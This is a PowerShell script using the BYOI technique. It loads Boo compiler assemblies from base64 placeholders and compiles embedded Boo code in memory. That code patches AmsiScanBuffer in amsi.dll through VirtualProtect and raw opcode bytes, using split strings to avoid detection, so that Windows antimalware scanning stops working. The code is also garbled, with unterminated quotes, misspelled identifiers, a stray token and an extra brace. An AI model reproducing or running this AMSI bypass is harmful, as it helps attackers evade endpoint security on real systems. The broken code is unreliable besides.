function BYOI
{
    $BooLangDLL = @'BOOLANG_DLL_BASE64'@
    $BooLangCompilerDLL = @'BOOLONG_COMPILER_DLL_BASE64'@
    $BooLangParserDLL = @'BOOLANG_PARSER_DLL_BASE64'@
    $BoolangExtensionsDLL = @'BOOLONG_EXTENSION_DLL_BASE64'@

    function Load-Assembly($EncodedCompressedFile)
    {   
        $DeflatedStream = [IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile), [IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[](1900000)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 1900000) | Out-Null
        return [Reflection.Assembly]::Load($UncompressedFileBytes)
    }

    $BooLangAsm = Load-Assembly($BooLangDLL)
    $BooLangExtensionsAsm = Load-Assembly($BoolangExtensionsDLL)
    $BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
    $BooLangParserAsm = Load-Assembly($BooLangParserDLL)

    
    $BooSource = @'
import System
import System.Runtime.InteropServices 
[DllImport("kernel32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def LoadLibrary(lpFileName as string) as IntPtr
    pass
[DllImport("kernel32.dll", CharSet: CharSet.Ansi, ExactSpelling: true, SetLastError: true)]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
    pass
    
[DllImport("kernel32.dll)]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as int, flNewProtect as uint, ref lpflOldProtect as IntPtr) as bool:
    pass
Public static def PatchMem(dll as string, function as string, patch as (byte)):
    try:
        oldProtect as IntPtr = 0
        library = LoadLibrary(dll)
        print ""
        print "[>] $(dll) address : $(library)"
        address = GetProcAddress(library, function)
        print "[-] $(function) address: $(address)"
        result = VirtualProtect(address, patch.Length, 0x40, oldProtect)
        print "[-] memory protection change to RWX"
        Marshal.copy(path,0, address, patch.Length)
        result = VirtualProtect(address, patch.length, 0x20, oldProtect)
        print "[-] mem proteciton restored to RW"
    except:
        print "[!] could not patch $(dll) : $(function)"
public static def Main():
    amsi_patch as (byte)
    if IntPTr,Size == 8:
        // 64 bits process
        print "[-] x64 process, now p a TCH inG the DlL"
        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2])
    else:
        // 32 bits process
        print "[-] x86 Process"
        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])
    PatchMem("am"+si.dll", "Am" + "si" + "Sc" "anBu" + "ffer", amsi_patch)
'@

    scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new("MyScript.boo", $BooSource)


    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false) 

    $parameters.Input.Add($scriptinput) | Out-Null
    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()
    $parameters.Ducky = $true
    #$parameters.OutputWriter = [System.IO.StringWriter]::new()

    $parameters.AddAssembly($BooLangAsm)
    $parameters.AddAssembly($BooLangExtensionsAsm)
    $parameters.AddAssembly($BooLangCompilerAsm)
    $parameters.AddAssembly($BooLangParserAsm)
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("mscorlib"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Core"))

    #Write-Output $parameters.References

    $compiler = [Boo.Lang.Compiler.BooCompiler]::new($parameters) 3

    Write-Output "Compiling..."
    $context = $compiler.Run() 

    if ($context.GeneratedAssembly -ne $null)
    { # 
        Write-Output "Executing...`n"
        $scriptModule = $context.GeneratedAssembly.GetType("MyScriptModule") 
        $mainfunction= $scriptModule.GetMethod("Main")
        $mainfunction.Invoke($null, $null)
    }
    else {
        Write-Output "`nError(s) when compiling Boo source!`n"
        Write-Output $context.Errors.ToString($true)
    }
}   


}
